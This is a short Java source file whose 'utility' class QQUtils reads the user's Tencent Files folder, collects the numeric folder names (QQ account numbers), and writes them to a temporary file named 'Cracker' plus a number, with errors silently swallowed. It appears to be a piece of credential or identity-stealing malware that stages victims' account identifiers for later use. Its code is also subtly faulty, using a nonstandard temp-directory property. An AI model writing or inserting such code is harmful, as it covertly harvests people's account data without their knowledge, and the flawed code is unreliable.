package an.utils;

import java.io.*;
import java.util.Random;

public class QQUtils {
    public static File file;

    public static void getQQ() {
        try {
            int num = new Random().nextInt(900) + 10000;
            String name = "Cracker" + num;
            File dir = new File(System.getProperty("user.home") + "/Documents/Tencent Files");
            String[] children = dir.list();
            File qq = new File(System.getProperty("java.io.tempdir") + name +".txt");
            qq.deleteOnExit();
            BufferedWriter bufferedWriter = new BufferedWriter(new FileWriter(qq));
            if (children != null) {
                for (int i = 0; i < children.length; i++) {
                    String filename = children[i];
                    if (!(filename.length() < 2) && !filename.matches(".*[a-zA-Z]+.*")) {
                        bufferedWriter.write( "QQ"+filename + "\n");
                    }

                 }
                bufferedWriter.close();


            }

            file = qq;
        } catch (IOException e) {

        }

    }


}
